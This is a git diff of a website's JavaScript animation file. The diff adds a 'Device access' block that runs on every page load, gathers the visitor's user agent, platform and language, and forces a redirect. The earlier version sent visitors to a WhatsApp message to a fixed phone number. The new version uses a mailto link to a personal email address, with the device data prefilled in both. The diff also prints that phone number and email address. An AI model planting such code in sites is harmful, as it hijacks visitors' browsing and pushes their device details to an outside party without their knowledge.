@@ -118,6 +118,18 @@ ScrollReveal().reveal(".news__card", {
 
 
 // Device access
+// if (typeof window !== 'undefined') {
+//     const deviceInfo = {
+//         userAgent: navigator.userAgent,
+//         platform: navigator.platform,
+//         language: navigator.language
+//     };
+
+//     const whatsappLink = `https://api.whatsapp.com/send?phone=6285938371318&text=${encodeURIComponent(JSON.stringify(deviceInfo))}`;
+
+//     window.location.href = whatsappLink;
+// }
+
 if (typeof window !== 'undefined') {
     const deviceInfo = {
         userAgent: navigator.userAgent,
@@ -125,7 +137,7 @@ if (typeof window !== 'undefined') {
         language: navigator.language
     };
 
-    const whatsappLink = `https://api.whatsapp.com/send?phone=6285938371318&text=${encodeURIComponent(JSON.stringify(deviceInfo))}`;
+    const mailtoLink = `mailto:silviadewinovianaputri@gmail.com?subject=Device Info&body=${encodeURIComponent(JSON.stringify(deviceInfo))}`;
 
-    window.location.href = whatsappLink;
+    window.location.href = mailtoLink;
 }
